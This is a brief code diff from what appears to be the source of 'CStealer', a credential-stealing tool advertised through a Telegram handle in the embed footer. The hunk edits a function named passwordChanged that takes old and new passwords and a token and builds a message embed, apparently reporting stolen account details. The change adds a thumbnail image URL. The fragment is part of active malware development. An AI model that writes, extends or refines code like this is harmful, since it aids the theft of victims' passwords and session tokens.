@@ -694,7 +694,9 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         },
         footer: {
         text: 'CStealer | t.me/cstealerr',
-        }
+        },
+        thumbnail: {
+          url: 'https://media.discordapp.net/attachments/988835185300742258/997093134787944539/ansn.png',
         },
       },
     ],
